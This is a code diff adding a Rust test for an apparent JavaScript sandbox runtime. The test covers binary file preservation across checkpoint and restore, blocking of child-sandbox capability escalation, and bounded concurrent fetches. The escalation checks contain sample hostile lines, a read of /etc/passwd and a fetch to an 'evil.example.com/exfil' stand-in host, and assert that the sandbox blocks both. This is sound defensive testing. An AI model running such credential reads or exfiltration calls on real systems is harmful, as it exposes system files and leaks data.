@@ -4309,6 +4309,159 @@ fn test_wave_d_wasm_5_ring_security_fuel_bomb_and_memory_cage() {
     }
 }
 
+#[test]
+fn test_wave_g_binary_vfs_roundtrip_eval_sandbox_ocap_and_bounded_fetch_concurrency() {
+    // 1. Binary VFS (`BOA_VFS_CACHE: FxHashMap<String, Vec<u8>>`) + Checkpoint/Restore without UTF-8 lossy corruption
+    let vfs_script = r#"
+import * as fs from "node:fs";
+
+const nonUtf8 = new Uint8Array([0xff, 0xfe, 0x00, 0x80, 0xc3, 0x28]);
+fs.writeFileSync("/workspace/raw.bin", nonUtf8);
+fs.appendFileSync("/workspace/raw.bin", Buffer.from([0xde, 0xad]));
+
+const snap = Slice.checkpoint();
+fs.writeFileSync("/workspace/raw.bin", "corrupted-overwrite");
+Slice.restore(snap);
+
+const readBuf = fs.readFileSync("/workspace/raw.bin", null);
+const readHex = fs.readFileSync("/workspace/raw.bin", "hex");
+const st = fs.statSync("/workspace/raw.bin");
+
+// Also verify Slice.evalSandbox blocks capability escalation when parent has only /workspace read/write
+const escFs = Slice.evalSandbox("const fs = require('node:fs'); fs.readFileSync('/etc/passwd', 'utf8');", {
+    allowRead: ["/etc"]
+});
+const escNet = Slice.evalSandbox("fetch('https://evil.example.com/exfil');", {
+    allowNet: ["evil.example.com"]
+});
+
+console.log(JSON.stringify({
+    bytes: Array.from(readBuf),
+    hex: readHex,
+    size: st.size,
+    mtimeReal: st.mtimeMs !== 1700000000000 && st.mtimeMs > 1700000000000,
+    escFsBlocked: escFs.ok === false && String(escFs.violation).includes("lacks filesystem read authority"),
+    escNetBlocked: escNet.ok === false && String(escNet.violation).includes("lacks outbound network authority")
+}));
+"#;
+
+    let caps = CapabilityToken::pure_compute()
+        .with_read_prefix("/workspace")
+        .with_write_prefix("/workspace");
+    let m = run_source_isolated("wave-g-binary-vfs", vfs_script, caps, 1_000_000, 16 * 1024 * 1024)
+        .expect("wave-g-binary-vfs execution");
+    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();
+    assert_eq!(
+        parsed["bytes"],
+        serde_json::json!([0xff, 0xfe, 0x00, 0x80, 0xc3, 0x28, 0xde, 0xad]),
+        "Binary VFS must preserve arbitrary non-UTF-8 bytes across writeFileSync/appendFileSync/checkpoint/restore"
+    );
+    assert_eq!(parsed["hex"], "fffe0080c328dead");
+    assert_eq!(parsed["size"], 8);
+    assert_eq!(parsed["mtimeReal"], true);
+    assert_eq!(parsed["escFsBlocked"], true);
+    assert_eq!(parsed["escNetBlocked"], true);
+
+    // 2. Direct Rust `SliceIsolate::eval_sandbox` on a `pure_compute()` parent must block child escalation
+    let mut pure_parent = SliceIsolate::spawn(
+        "wave-g-pure-parent",
+        1,
+        CapabilityToken::pure_compute(),
+        1_000_000,
+        8 * 1024 * 1024,
+    );
+    let outcome_fs = pure_parent.eval_sandbox(
+        "const fs = require('node:fs'); fs.readFileSync('/etc/passwd', 'utf8');",
+        crate::SandboxEvalOptions {
+            allow_read: vec!["/etc".to_string()],
+            ..Default::default()
+        },
+    );
+    assert!(
+        !outcome_fs.ok
+            && outcome_fs
+                .violation
+                .as_deref()
+                .unwrap_or("")
+                .contains("lacks filesystem read authority"),
+        "pure_compute() parent must never allow child allow_read escalation: {:?}",
+        outcome_fs
+    );
+
+    let outcome_net = pure_parent.eval_sandbox(
+        "fetch('https://evil.example.com/exfil');",
+        crate::SandboxEvalOptions {
+            allow_net: vec!["evil.example.com".to_string()],
+            ..Default::default()
+        },
+    );
+    assert!(
+        !outcome_net.ok
+            && outcome_net
+                .violation
+                .as_deref()
+                .unwrap_or("")
+                .contains("lacks outbound network authority"),
+        "pure_compute() parent must never allow child allow_net escalation: {:?}",
+        outcome_net
+    );
+
+    // 3. Concurrent `Promise.all` fetch batching > 16 requests bounded by `MAX_CONCURRENT_FETCHES = 16`
+    use std::io::{Read, Write};
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let server_handle = std::thread::spawn(move || {
+        for _ in 0..24 {
+            if let Ok((mut stream, _)) = listener.accept() {
+                let mut buf = [0u8; 1024];
+                let n = stream.read(&mut buf).unwrap_or(0);
+                let req_str = String::from_utf8_lossy(&buf[..n]);
+                let id = req_str
+                    .lines()
+                    .next()
+                    .and_then(|l| l.split_whitespace().nth(1))
+                    .unwrap_or("/0")
+                    .trim_start_matches('/');
+                let body = format!("ok-{}", id);
+                let resp = format!(
+                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+                    body.len(),
+                    body
+                );
+                let _ = stream.write_all(resp.as_bytes());
+            }
+        }
+    });
+
+    let batch_script = format!(
+        r#"
+(async () => {{
+    const urls = [];
+    for (let i = 0; i < 24; i++) {{
+        urls.push("http://127.0.0.1:{port}/" + i);
+    }}
+    const responses = await Promise.all(urls.map((u) => fetch(u).then((r) => r.text())));
+    console.log(JSON.stringify({{ count: responses.length, first: responses[0], last: responses[23] }}));
+}})();
+"#,
+        port = port
+    );
+    let fetch_caps = CapabilityToken::pure_compute().with_net_host("127.0.0.1");
+    let fm = run_source_isolated(
+        "wave-g-bounded-fetch",
+        &batch_script,
+        fetch_caps,
+        2_000_000,
+        16 * 1024 * 1024,
+    )
+    .expect("wave-g-bounded-fetch execution");
+    let _ = server_handle.join();
+    let f_out: serde_json::Value = serde_json::from_str(&fm.stdout[0]).unwrap();
+    assert_eq!(f_out["count"], 24);
+    assert_eq!(f_out["first"], "ok-0");
+    assert_eq!(f_out["last"], "ok-23");
+}
+
 
 
 
